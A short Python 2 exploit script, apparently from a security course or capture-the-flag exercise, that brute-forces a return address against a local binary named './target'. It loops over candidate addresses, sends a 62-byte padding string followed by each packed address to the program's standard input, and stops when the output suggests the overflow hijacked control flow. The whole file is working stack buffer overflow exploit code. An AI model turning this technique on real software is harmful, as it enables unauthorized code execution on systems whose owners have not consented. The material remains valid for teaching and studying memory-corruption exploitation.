#!/usr/bin/env python2

import sys
import os
import struct
import subprocess as sp

def p32(n):
    return struct.pack("<I", n)

def p64(n):
    return struct.pack("<Q", n)

if __name__ == '__main__':

    assert p32(0x12345678) == b'\x78\x56\x34\x12'
    assert p64(0x12345678) == b'\x78\x56\x34\x12\x00\x00\x00\x00'
  
    hex_digits = "0123456789abcdef"

    for i in range(5,7):
      for j in hex_digits:
        for k in hex_digits:
          address_string = "0x56ijk8bd"
          address_string = address_string.replace("i",str(i))
          address_string = address_string.replace("j",j)
          address_string = address_string.replace("k",k)
          cmds = ["./target"]
          env = os.environ
          hex_int = int(address_string, 16)
          input = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPP" + p32(hex_int)  + "\n"

          p = sp.Popen(cmds, env=env,
                 stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.PIPE,
                 universal_newlines=False)
          stdout, stderr = p.communicate(input)
          print stdout
          if len(stdout) > 50:
            sys.exit()
          p.wait()
